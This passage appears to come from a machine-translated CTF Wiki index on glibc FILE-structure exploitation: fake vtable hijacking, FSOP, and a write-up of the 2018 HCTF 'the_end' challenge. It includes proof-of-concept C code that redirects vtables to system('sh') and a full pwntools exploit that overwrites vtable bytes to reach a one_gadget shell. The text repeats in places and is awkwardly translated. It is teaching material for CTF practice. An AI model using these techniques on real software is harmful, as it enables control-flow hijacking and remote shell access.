will be used in functions such as printf\\scanf. Prior to libc2.23, these vtables were writable and there were no other tests. print &amp; _IO_2_1_stdin_ $ 2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt; 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 2018 HCTF the_end \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/ ) Basic Information \u00b6 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { signed int i; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] sleep(0); printf(\"here is a gift %p, good luck ;)\\n\", &sleep); fflush(_bss_start); close(1); close(2); for ( i = 0; i <= 4; ++i ) { read(0, &buf, 8uLL); read(0, buf, 1uLL); } exit(1337); } Analyze the problem, using the point is very clear in the main function, and: In addition to canary protection libc base address and libc version Ability to write 5 bytes anywhere Ideas: \u00b6 Utilizing the program to call exit , it will traverse _IO_list_all and call the _setbuf function in vatable under _IO_2_1_stdout_ . You can modify two bytes to forge a fake_vtable near the current vtable and then use 3 bytes to modify the contents of _setbuf in fake_vtable to one_gadget . We first debug to find the offset of _IO_2_1_stdout_ and libc. The stupid thing here is that I originally searched for related symbols in gdb, but in fact the address found is the location of the symbol _IO_2_1_stdout_ , not its The location on the libc data segment, we use the ida or libcsearch tool to find the vtables offset 0x3C56F8 as follows: .data:00000000003C56F8 dq offset _IO_file_jumps // vtables .data:00000000003C5700 public stderr .data:00000000003C5700 stderr dq offset _IO_2_1_stderr_ .data:00000000003C5700 ; DATA XREF: LOAD:000000000000BAF0\u2191o .data:00000000003C5700 ; fclose+F2\u2191r ... .data:00000000003C5708 public stdout .data:00000000003C5708 stdout dq offset _IO_2_1_stdout_ .data:00000000003C5708 ; DATA XREF: LOAD:0000000000009F48\u2191o .data:00000000003C5708 ; fclose+E9\u2191r ... .data:00000000003C5710 public stdin .data:00000000003C5710 stdin dq offset _IO_2_1_stdin_ .data:00000000003C5710 ; DATA XREF: LOAD:0000000000006DF8\u2191o .data:00000000003C5710 ; fclose:loc_6D340\u2191r ... .data:00000000003C5718 dq offset sub_20B70 .data:00000000003C5718 _data ends .data:00000000003C5718 .bss:00000000003C5720 ; =========================================================================== Let's look at the contents of the virtual table: pwndbg> x /30gx 0x7f41d9c026f8 0x7f41d9c026f8 &lt;_IO_2_1_stdout_ + 216&gt;: 0x00007f41d9c006e0 0x00007f41d9c02540 0x7f41d9c02708 <stdout>: 0x00007f41d9c02620 0x00007f41d9c018e0 0x7f41d9c02718 <DW.ref.__gcc_personality_v0>: 0x00007f41d985db70 0x0000000000000000 0x7f41d9c02728 <string_space>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02738 &lt;__ printf_va_arg_table&gt;: 0x0000000000000000 0x0000000000000000 0x7f41d9c02748 <transitions>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02758 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02768 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02778 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02788 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02798 <getttyname_name>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027a8 <fcvt_bufptr>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027b8 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027c8 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027d8 <buffer>: 0x0000000000000000 0x0000000000000000 Then at this time look for a fake_vtable near the virtual table, the following conditions must be met: fake_vtable_addr + 0x58 = libc_base + off_set_3 where 0x58 is checked according to the table below is the offset of set_buf in the virtual table void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // target location 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; I chose the following address as fake_vtable here: pwndbg> x /60gx 0x7f41d9c02500 0x7f41d9c02500 <_nl_global_locale+224>: 0x00007f41d99cb997 0x0000000000000000 0x7f41d9c02510: 0x0000000000000000 0x0000000000000000 0x7f41d9c02520 <_IO_list_all>: 0x00007f41d9c02540 0x0000000000000000 0x7f41d9c02530: 0x0000000000000000 0x0000000000000000 0x7f41d9c02540 <_IO_2_1_stderr_>: 0x00000000fbad2086 0x0000000000000000 0x7f41d9c02550 <_IO_2_1_stderr_+16>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02560 <_IO_2_1_stderr_+32>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02570 <_IO_2_1_stderr_+48>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02580 <_IO_2_1_stderr_+64>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02590 <_IO_2_1_stderr_+80>: 0x0000000000000000 0x0000000000000000 0x7f41d9c025a0 <_IO_2_1_stderr_+96>: 0x0000000000000000 0x00007f41d9c02620 0x7f41d9c025b0 <_IO_2_1_stderr_+112>: 0x0000000000000002 0xffffffffffffffff 0x7f41d9c025c0 <_IO_2_1_stderr_+128>: 0x0000000000000000 0x00007f41d9c03770 0x7f41d9c025d0 <_IO_2_1_stderr_+144>: 0xffffffffffffffff 0x0000000000000000 0x7f41d9c025e0 <_IO_2_1_stderr_+160>: 0x00007f41d9c01660 0x0000000000000000 0x7f41d9c025f0 <_IO_2_1_stderr_+176>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02600 <_IO_2_1_stderr_+192>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02610 <_IO_2_1_stderr_+208>: 0x0000000000000000 0x00007f41d9c006e0 0x7f41d9c02620 <_IO_2_1_stdout_>: 0x00000000fbad2a84 0x00005582e351c010 0x7f41d9c02630 <_IO_2_1_stdout_+16>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02640 <_IO_2_1_stdout_+32>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02650 <_IO_2_1_stdout_+48>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02660 <_IO_2_1_stdout_+64>: 0x00005582e351c410 0x0000000000000000 0x7f41d9c02670 <_IO_2_1_stdout_+80>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02680 <_IO_2_1_stdout_+96>: 0x0000000000000000 0x00007f41d9c018e0 0x7f41d9c02690 <_IO_2_1_stdout_+112>: 0x0000000000000001 0xffffffffffffffff 0x7f41d9c026a0 <_IO_2_1_stdout_+128>: 0x0000000000000000 0x00007f41d9c03780 0x7f41d9c026b0 <_IO_2_1_stdout_+144>: 0xffffffffffffffff 0x0000000000000000 0x7f41d9c026c0 <_IO_2_1_stdout_+160>: 0x00007f41d9c017a0 0x0000000000000000 0x7f41d9c026d0 <_IO_2_1_stdout_+176>: 0x0000000000000000 0x0000000000000000 pwndbg> distance 0x7f41d9c025e0 0x7f41d983d000 0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words) pwndbg> p 0x7f41d9c025e0 -0x58 $10 = 0x7f41d9c02588 pwndbg> distance 0x7f41d9c02588 0x7f41d983d000 0x7f41d9c02588->0x7f41d983d000 is -0x3c5588 bytes (-0x78ab1 words) pwndbg> distance 0x7f41d9c025e0 0x7f41d983d000 0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words) The final exploit script is as follows: from pwn import * context.log_level=\"debug\" libc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") # p = process('the_end') p = remote('127.0.0.1',1234) to = 0 if rem ==1: p = remote('150.109.44.250',20002) p.recvuntil('Input your token:') p.sendline ( &#39;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#39;) sleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1] libc_base = long(sleep_ad,16) - libc.symbols['sleep'] one_gadget = libc_base + 0xf02b0 vtables = libc_base + 0x3C56F8 fake_vtable = libc_base + 0x3c5588 target_addr = libc_base + 0x3c55e0 print 'libc_base: ',hex(libc_base) print 'one_gadget:',hex(one_gadget) print 'exit_addr:',hex(libc_base + libc.symbols['exit']) # gdb.attach(p) for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i]) for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i]) p.sendline(\"exec /bin/sh 1>&0\") p.interactive()","title":"Forged Vtable to Hijack Control Flow"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#vtable-hijack-program-flow","text":"","title":"\u5047\u9020vtable hijack program flow"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#introduction","text":"Earlier we introduced the file stream feature (FILE) in Linux. We can see that some common IO operation functions in Linux need to be processed through the FILE structure. In particular, there is a vtable in the _IO_FILE_plus structure, and some functions will fetch the pointers in the vtable for calling. Therefore, the central idea of the fake vtable hijacking process is to implement the vtable of _IO_FILE_plus by pointing the vtable to the memory we control and placing the function pointer in it. Therefore, vtable hijacking is divided into two types. One is to directly rewrite the function pointer in the vtable, which can be realized by writing at any address. The other is to overwrite the vtable pointer to the memory we control, and then arrange the function pointer in it.","title":"Introduction"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#practice","text":"Here is a demonstration of the pointer in the vtable, first need to know where _IO_FILE_plus is located, in the case of fopen is located in the heap memory, for stdin\\stdout\\stderr is located in libc.so. int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } The address of the vtable is obtained according to the offset of the vtable at _IO_FILE_plus, and the offset is 0xd8 under the 64-bit system. After that, you need to find out which function in the vtable is called by the IO function to be hijacked. About the IO function call vtable has been given in the FILE structure introduction section, know that printf will call xsputn in the vtable, and xsputn is the eighth item in the vtable can be written to this pointer for hijacking. And when the vtable function such as xsputn is called, the first parameter passed in is actually the corresponding IO_FILE_plus address. For example, this example calls printf, and the first parameter passed to the vtable is the address of _IO_2_1_stdout . Use this to pass arguments to the hijacked vtable function, such as #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr [7] = system_ptr // xsputn fwrite(\"hi\",2,1,fp); } However, under the current libc2.23 version, the vtable located in the libc data segment cannot be written. However, it can still be exploited by forging vtables in controllable memory. #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp); } We first allocate a memory to store the fake vtable, then modify the _IO_FILE_plus vtable pointer to point to this memory. Because the pointer in the vtable we are placing the address of the system function, we need to pass the parameter \"/bin/sh\" or \"sh\". Because the function in the vtable will call the corresponding _IO_FILE_plus pointer as the first parameter, so here we write \"sh\" to the _IO_FILE_plus header. Subsequent calls to fwrite will execute system(\"sh\") via our fake vtable. Similarly, if _IO_FILE created by fopen and other functions does not exist in the program, you can also select _IO_FILE located in libc.so such as stdin\\stdout\\stderr. These streams will be used in functions such as printf\\scanf. Prior to libc2.23, these vtables were writable and there were no other tests. print &amp; _IO_2_1_stdin_ $ 2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt; 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so","title":"Practice"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#2018-hctf-the_end","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/ )","title":"2018 HCTF the_end"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#basic-information","text":"void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { signed int i; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] sleep(0); printf(\"here is a gift %p, good luck ;)\\n\", &sleep); fflush(_bss_start); close(1); close(2); for ( i = 0; i <= 4; ++i ) { read(0, &buf, 8uLL); read(0, buf, 1uLL); } exit(1337); } Analyze the problem, using the point is very clear in the main function, and: In addition to canary protection libc base address and libc version Ability to write 5 bytes anywhere","title":"Basic Information"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#ideas","text":"Utilizing the program to call exit , it will traverse _IO_list_all and call the _setbuf function in vatable under _IO_2_1_stdout_ . You can modify two bytes to forge a fake_vtable near the current vtable and then use 3 bytes to modify the contents of _setbuf in fake_vtable to one_gadget . We first debug to find the offset of _IO_2_1_stdout_ and libc. The stupid thing here is that I originally searched for related symbols in gdb, but in fact the address found is the location of the symbol _IO_2_1_stdout_ , not its The location on the libc data segment, we use the ida or libcsearch tool to find the vtables offset 0x3C56F8 as follows: .data:00000000003C56F8 dq offset _IO_file_jumps // vtables .data:00000000003C5700 public stderr .data:00000000003C5700 stderr dq offset _IO_2_1_stderr_ .data:00000000003C5700 ; DATA XREF: LOAD:000000000000BAF0\u2191o .data:00000000003C5700 ; fclose+F2\u2191r ... .data:00000000003C5708 public stdout .data:00000000003C5708 stdout dq offset _IO_2_1_stdout_ .data:00000000003C5708 ; DATA XREF: LOAD:0000000000009F48\u2191o .data:00000000003C5708 ; fclose+E9\u2191r ... .data:00000000003C5710 public stdin .data:00000000003C5710 stdin dq offset _IO_2_1_stdin_ .data:00000000003C5710 ; DATA XREF: LOAD:0000000000006DF8\u2191o .data:00000000003C5710 ; fclose:loc_6D340\u2191r ... .data:00000000003C5718 dq offset sub_20B70 .data:00000000003C5718 _data ends .data:00000000003C5718 .bss:00000000003C5720 ; =========================================================================== Let's look at the contents of the virtual table: pwndbg> x /30gx 0x7f41d9c026f8 0x7f41d9c026f8 &lt;_IO_2_1_stdout_ + 216&gt;: 0x00007f41d9c006e0 0x00007f41d9c02540 0x7f41d9c02708 <stdout>: 0x00007f41d9c02620 0x00007f41d9c018e0 0x7f41d9c02718 <DW.ref.__gcc_personality_v0>: 0x00007f41d985db70 0x0000000000000000 0x7f41d9c02728 <string_space>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02738 &lt;__ printf_va_arg_table&gt;: 0x0000000000000000 0x0000000000000000 0x7f41d9c02748 <transitions>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02758 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02768 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02778 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02788 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02798 <getttyname_name>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027a8 <fcvt_bufptr>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027b8 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027c8 <buffer>: 0x0000000000000000 0x0000000000000000 0x7f41d9c027d8 <buffer>: 0x0000000000000000 0x0000000000000000 Then at this time look for a fake_vtable near the virtual table, the following conditions must be met: fake_vtable_addr + 0x58 = libc_base + off_set_3 where 0x58 is checked according to the table below is the offset of set_buf in the virtual table void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // target location 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; I chose the following address as fake_vtable here: pwndbg> x /60gx 0x7f41d9c02500 0x7f41d9c02500 <_nl_global_locale+224>: 0x00007f41d99cb997 0x0000000000000000 0x7f41d9c02510: 0x0000000000000000 0x0000000000000000 0x7f41d9c02520 <_IO_list_all>: 0x00007f41d9c02540 0x0000000000000000 0x7f41d9c02530: 0x0000000000000000 0x0000000000000000 0x7f41d9c02540 <_IO_2_1_stderr_>: 0x00000000fbad2086 0x0000000000000000 0x7f41d9c02550 <_IO_2_1_stderr_+16>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02560 <_IO_2_1_stderr_+32>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02570 <_IO_2_1_stderr_+48>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02580 <_IO_2_1_stderr_+64>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02590 <_IO_2_1_stderr_+80>: 0x0000000000000000 0x0000000000000000 0x7f41d9c025a0 <_IO_2_1_stderr_+96>: 0x0000000000000000 0x00007f41d9c02620 0x7f41d9c025b0 <_IO_2_1_stderr_+112>: 0x0000000000000002 0xffffffffffffffff 0x7f41d9c025c0 <_IO_2_1_stderr_+128>: 0x0000000000000000 0x00007f41d9c03770 0x7f41d9c025d0 <_IO_2_1_stderr_+144>: 0xffffffffffffffff 0x0000000000000000 0x7f41d9c025e0 <_IO_2_1_stderr_+160>: 0x00007f41d9c01660 0x0000000000000000 0x7f41d9c025f0 <_IO_2_1_stderr_+176>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02600 <_IO_2_1_stderr_+192>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02610 <_IO_2_1_stderr_+208>: 0x0000000000000000 0x00007f41d9c006e0 0x7f41d9c02620 <_IO_2_1_stdout_>: 0x00000000fbad2a84 0x00005582e351c010 0x7f41d9c02630 <_IO_2_1_stdout_+16>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02640 <_IO_2_1_stdout_+32>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02650 <_IO_2_1_stdout_+48>: 0x00005582e351c010 0x00005582e351c010 0x7f41d9c02660 <_IO_2_1_stdout_+64>: 0x00005582e351c410 0x0000000000000000 0x7f41d9c02670 <_IO_2_1_stdout_+80>: 0x0000000000000000 0x0000000000000000 0x7f41d9c02680 <_IO_2_1_stdout_+96>: 0x0000000000000000 0x00007f41d9c018e0 0x7f41d9c02690 <_IO_2_1_stdout_+112>: 0x0000000000000001 0xffffffffffffffff 0x7f41d9c026a0 <_IO_2_1_stdout_+128>: 0x0000000000000000 0x00007f41d9c03780 0x7f41d9c026b0 <_IO_2_1_stdout_+144>: 0xffffffffffffffff 0x0000000000000000 0x7f41d9c026c0 <_IO_2_1_stdout_+160>: 0x00007f41d9c017a0 0x0000000000000000 0x7f41d9c026d0 <_IO_2_1_stdout_+176>: 0x0000000000000000 0x0000000000000000 pwndbg> distance 0x7f41d9c025e0 0x7f41d983d000 0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words) pwndbg> p 0x7f41d9c025e0 -0x58 $10 = 0x7f41d9c02588 pwndbg> distance 0x7f41d9c02588 0x7f41d983d000 0x7f41d9c02588->0x7f41d983d000 is -0x3c5588 bytes (-0x78ab1 words) pwndbg> distance 0x7f41d9c025e0 0x7f41d983d000 0x7f41d9c025e0->0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words) The final exploit script is as follows: from pwn import * context.log_level=\"debug\" libc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") # p = process('the_end') p = remote('127.0.0.1',1234) to = 0 if rem ==1: p = remote('150.109.44.250',20002) p.recvuntil('Input your token:') p.sendline ( &#39;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#39;) sleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1] libc_base = long(sleep_ad,16) - libc.symbols['sleep'] one_gadget = libc_base + 0xf02b0 vtables = libc_base + 0x3C56F8 fake_vtable = libc_base + 0x3c5588 target_addr = libc_base + 0x3c55e0 print 'libc_base: ',hex(libc_base) print 'one_gadget:',hex(one_gadget) print 'exit_addr:',hex(libc_base + libc.symbols['exit']) # gdb.attach(p) for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i]) for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i]) p.sendline(\"exec /bin/sh 1>&0\") p.interactive()","title":"Ideas:"},{"location":"pwn/linux/io_file/fsop/","text":"FSOP \u00b6 Introduction \u00b6 FSOP is the abbreviation of File Stream Oriented Programming. According to the previous introduction to FILE, all the _IO_FILE structures in the process will be connected to each other using the _chain field to form a linked list. The header of this linked list is maintained by _IO_list_all. The core idea of the FSOP is to hijack the value of _IO_list_all to fake the linked list and the _IO_FILE entry, but pure forgery just constructs the data and needs some way to trigger. The trigger method for FSOP selection is to call _IO_flush_all_lockp. This function will refresh the file stream of all items in the _IO_list_all list, which is equivalent to calling fflush for each FILE, and correspondingly calling _IO_overflow in _IO_FILE_plus.vtable. int _IO_flush_all_lockp (int do_lock) { ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... } } _IO_flush_all_lockp does not require an attacker to manually invoke it. In some cases this function will be called by the system: When libc executes the abort process When executing the exit function When the execution flow returns from the main function example \u00b6 To sort out the conditions used by the FSOP, the attacker first needs to know the libc.so base address, because _IO_list_all is stored as a global variable in libc.so, and _IO_list_all cannot be overwritten without leaking the libc base address. Then you need to use any address to write the contents of _IO_list_all to pointers to our controllable memory. The next question is what data is placed in the controllable memory, and there is no doubt that we need to lay out a vtable pointer to our ideal function. But in order for the fake_FILE we constructed to work properly, we need to lay out some other data. The basis here is the one we gave earlier. if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } That is fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base Here we verify this with an example. First we allocate a block of memory for the fake vtable and _IO_FILE_plus. In order to bypass the verification, we get the offset of the data fields such as _IO_write_ptr, _IO_write_base, _mode in advance, so that the corresponding data can be constructed in the forged vtable. #define _IO_list_all 0x7ffff7dd2520 #define mode_offset 0xc0 #define writeptr_offset 0x28 #define writebase_offset 0x20 #define vtable_offset 0xd8 int main(void) { void * ptr; long long *list_all_ptr; ptr = malloc (0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0); } We use the first 0x100 bytes of allocated memory as _IO_FILE, the last 0x100 bytes as vtable, and the 0x41414141 address in the vtable as the fake _IO_overflow pointer. After that, overwrite the global variable _IO_list_all in libc and point it to our fake _IO_FILE_plus. By calling the exit function, the program will execute _IO_flush_all_lockp, get the value of _IO_list_all via fflush and retrieve the _IO_overflow called as _IO_FILE_plus. ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main()","title":"FSOP"},{"location":"pwn/linux/io_file/fsop/#fsop","text":"","title":"FSOP"},{"location":"pwn/linux/io_file/fsop/#introduction","text":"FSOP is the abbreviation of File Stream Oriented Programming. According to the previous introduction to FILE, all the _IO_FILE structures in the process will be connected to each other using the _chain field to form a linked list. The header of this linked list is maintained by _IO_list_all. The core idea of the FSOP is to hijack the value of _IO_list_all to fake the linked list and the _IO_FILE entry, but pure forgery just constructs the data and needs some way to trigger. The trigger method for FSOP selection is to call _IO_flush_all_lockp. This function will refresh the file stream of all items in the _IO_list_all list, which is equivalent to calling fflush for each FILE, and correspondingly calling _IO_overflow in _IO_FILE_plus.vtable. int _IO_flush_all_lockp (int do_lock) { ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... } } _IO_flush_all_lockp does not require an attacker to manually invoke it. In some cases this function will be called by the system: When libc executes the abort process When executing the exit function When the execution flow returns from the main function","title":"Introduction"},{"location":"pwn/linux/io_file/fsop/#example","text":"To sort out the conditions used by the FSOP, the attacker first needs to know the libc.so base address, because _IO_list_all is stored as a global variable in libc.so, and _IO_list_all cannot be overwritten without leaking the libc base address. Then you need to use any address to write the contents of _IO_list_all to pointers to our controllable memory. The next question is what data is placed in the controllable memory, and there is no doubt that we need to lay out a vtable pointer to our ideal function. But in order for the fake_FILE we constructed to work properly, we need to lay out some other data. The basis here is the one we gave earlier. if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } That is fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base Here we verify this with an example. First we allocate a block of memory for the fake vtable and _IO_FILE_plus. In order to bypass the verification, we get the offset of the data fields such as _IO_write_ptr, _IO_write_base, _mode in advance, so that the corresponding data can be constructed in the forged vtable. #define _IO_list_all 0x7ffff7dd2520 #define mode_offset 0xc0 #define writeptr_offset 0x28 #define writebase_offset 0x20 #define vtable_offset 0xd8 int main(void) { void * ptr; long long *list_all_ptr; ptr = malloc (0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0); } We use the first 0x100 bytes of allocated memory as _IO_FILE, the last 0x100 bytes as vtable, and the 0x41414141 address in the vtable as the fake _IO_overflow pointer. After that, overwrite the global variable _IO_list_all in libc and point it to our fake _IO_FILE_plus. By calling the exit function, the program will execute _IO_flush_all_lockp, get the value of _IO_list_all via fflush and retrieve the _IO_overflow called as _IO_FILE_plus. ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main()","title":"example"},{"location":"pwn/linux/io_file/introduction/","text":"FILE\u7ed3\u6784 \u00b6 FILE Introduction \u00b6 FILE is a structure for describing files in a standard IO library of a Linux system, called a file stream. The FILE structure is created when the program executes functions such as fopen and is allocated in the heap. We often define a pointer to the FILE structure to receive this return value. The FILE structure is defined in libio.h as shown below struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; The FILE structure in the process will be connected to each other through the _chain field to form a linked list. The linked list header is represented by the global variable _IO_list_all. Through this value, we can traverse all the FILE structures. In the standard I/O library, three file streams are automatically opened at the start of each program: stdin, stdout, stderr. So in the initial state, _IO_list_all points to a linked list of these file streams, but it should be noted 